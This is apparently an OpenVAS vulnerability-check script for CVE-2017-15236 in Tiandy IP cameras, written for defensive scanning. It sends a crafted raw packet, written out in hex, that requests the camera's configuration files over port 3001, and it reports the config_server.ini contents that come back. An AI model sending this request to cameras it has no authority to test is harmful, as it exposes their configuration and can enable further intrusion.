##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tiandy_tech_info_disc_vuln.nasl 12038 2018-10-23 12:58:19Z asteins $
#
# Tiandy IP cameras Sensitive Information Disclosure Vulnerability
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107183");
  script_version("$Revision: 12038 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-23 14:58:19 +0200 (Tue, 23 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-10-04 16:39:44 +0530 (Wed, 04 Oct 2017)");
  script_cve_id("CVE-2017-15236");
  script_name("Tiandy IP cameras Sensitive Information Disclosure Vulnerability");

  script_tag(name:"summary", value:"A Tiandy IP Camera is running on this host and is prone to a sensitive information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted packet using sockets and check the response.");

  script_tag(name:"insight", value:"Tiandy uses a proprietary protocol, a flaw in the protocol allows an attacker to forge a request that will return configuration settings of the Tiandy IP camera.");

  script_tag(name:"impact", value:"Successful exploitation will allow an attacker to download the following files:

  - config_server.ini

  - extendword.txt

  - config_ptz.dat

  - config_right.dat

  - config_dg.dat

  - config_burn.dat.");

  script_tag(name:"affected", value:"Tiandy IP cameras version 5.56.17.120.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3444");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl");

  script_family("General");
  script_require_ports("Services/unknown", 3001);

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");

function tiandy_recv( soc )
{
    r = recv( socket:soc, length: 1024 );

    if( ! r || strlen( r ) < 1024 ) return;
    len = ord( r[7] );
    if( ! len || len < 1 ) return r;
    r += recv( socket:soc, length:len );

    return r;

}

port = get_unknown_port(default:3001);

ip = get_host_ip();

if(! soc = open_sock_tcp(port)) exit(0);

req = raw_string(0x74, 0x1f, 0x4a, 0x84, 0xc8, 0xa8, 0xe4, 0xb3,
                 0x18, 0x7f, 0xd2, 0x21, 0x08, 0x00, 0x45, 0x00,
                 0x00, 0xcc, 0x3e, 0x9a, 0x40, 0x00, 0x40, 0x06,
                 0xd4, 0x13, 0xac, 0x10, 0x65, 0x75, 0x6e, 0x31,
                 0xa7, 0xc7, 0x43, 0x5b, 0x0b, 0xb9, 0x85, 0xbc,
                 0x1d, 0xf0, 0x5b, 0x3e, 0xe8, 0x32, 0x50, 0x18,
                 0x7f, 0xa4, 0xc6, 0xcf, 0x00, 0x00, 0xf1, 0xf5,
                 0xea, 0xf5, 0x74, 0x00, 0xa4, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x90, 0x00) + ip +
       raw_string(0x09, 0x50, 0x52, 0x4f, 0x58, 0x59, 0x09, 0x43,
                 0x4d, 0x44, 0x09, 0x44, 0x48, 0x09, 0x43, 0x46,
                 0x47, 0x46, 0x49, 0x4c, 0x45, 0x09, 0x44, 0x4f,
                 0x57, 0x4e, 0x4c, 0x4f, 0x41, 0x44, 0x09, 0x36,
                 0x09, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x5f,
                 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2e, 0x69,
                 0x6e, 0x69, 0x09, 0x65, 0x78, 0x74, 0x65, 0x6e,
                 0x64, 0x77, 0x6f, 0x72, 0x64, 0x2e, 0x74, 0x78,
                 0x74, 0x09, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67,
                 0x5f, 0x70, 0x74, 0x7a, 0x2e, 0x64, 0x61, 0x74,
                 0x09, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x5f,
                 0x72, 0x69, 0x67, 0x68, 0x74, 0x2e, 0x64, 0x61,
                 0x74, 0x09, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67,
                 0x5f, 0x64, 0x67, 0x2e, 0x64, 0x61, 0x74, 0x09,
                 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x5f, 0x62,
                 0x75, 0x72, 0x6e, 0x2e, 0x64, 0x61, 0x74, 0x0a,
                 0x0a, 0x0a);


send (socket:soc, data:req);
max = 0;

while(TRUE)
{
        max+= 1;
        if (max >= 10) break;
        x = tiandy_recv(soc:soc);

        if (!x) break;
        res += x;
        len = strlen(x);

        if(x[len-1] == raw_string( 0x20 ) && x[len-2] == raw_string( 0x20 ) && x[len-3] == raw_string( 0x20 ) && x[len-4] == raw_string( 0x5d ) && x[len-5] == raw_string( 0x33 ) && x[len-6] == raw_string( 0x6d ) && x[len-7] == raw_string( 0x6f ) && x[len-8] == raw_string( 0x63 ))  break;

}


if ("kTiandy" >< res && "config_server.ini" >< res && "extendword.txt" >< res && "[log]" >< res)
{
    close (soc);

    report = 'By sending a special request, it was possible to disclose the content of the config_server.ini file : \n';

    report+= res;

    security_message(port: port, data: report);
    exit(0);

}

if (soc) close (soc);

exit (99);
